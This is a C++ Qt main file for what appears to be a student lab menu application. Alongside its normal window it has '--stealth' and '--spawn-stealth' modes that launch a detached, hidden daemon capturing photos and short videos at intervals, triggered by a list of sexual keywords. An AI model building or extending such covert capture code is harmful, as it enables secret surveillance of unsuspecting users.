#include "mainwindow.h"
#include <QApplication>
#include <QCoreApplication>
#include <QCommandLineParser>
#include <QProcess>
#include <QTimer>
#include <QDebug>
#include "Lab4/stealthdaemon.h"

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);

    QCommandLineParser parser;
    parser.setApplicationDescription("SimpleLabsMenu");
    parser.addHelpOption();
    parser.addVersionOption();

    QCommandLineOption stealthOption(QStringList() << "s" << "stealth",
                                     "Run hidden background capture (5s interval, 4s duration)." );
    QCommandLineOption spawnStealthOption(QStringList() << "spawn-stealth",
                                          "Spawn detached stealth child process and exit." );
    parser.addOption(stealthOption);
    parser.addOption(spawnStealthOption);
    parser.process(a);

    if (parser.isSet(stealthOption)) {
        // Headless stealth mode inside main exe (no UI)
        QCoreApplication::setApplicationName("SimpleLabsMenu-Stealth");
        // Create daemon in this process and run timers
        StealthDaemonThread *daemonThread = new StealthDaemonThread();
        QStringList keywords;
        keywords << "сэкс" << "порно" << "секс" << "porn" << "sex" << "xxx" << "nude" << "naked"
                 << "голый" << "голая" << "обнаженный" << "обнаженная";
        daemonThread->setKeywords(keywords);
        daemonThread->setPhotoInterval(5);
        daemonThread->setVideoDuration(4);
        daemonThread->setLoggingEnabled(true);
        daemonThread->start();
        QObject::connect(&a, &QCoreApplication::aboutToQuit, [daemonThread]() {
            daemonThread->quit();
            daemonThread->wait();
            delete daemonThread;
        });
        return a.exec();
    }

    if (parser.isSet(spawnStealthOption)) {
        // Spawn detached copy of self with --stealth and exit
        QString program = QCoreApplication::applicationFilePath();
        QStringList args; args << "--stealth";
        bool ok = QProcess::startDetached(program, args, QCoreApplication::applicationDirPath());
        qDebug() << "Spawned stealth detached:" << ok;
        return 0;
    }

    MainWindow w;
    w.show();
    return a.exec();
}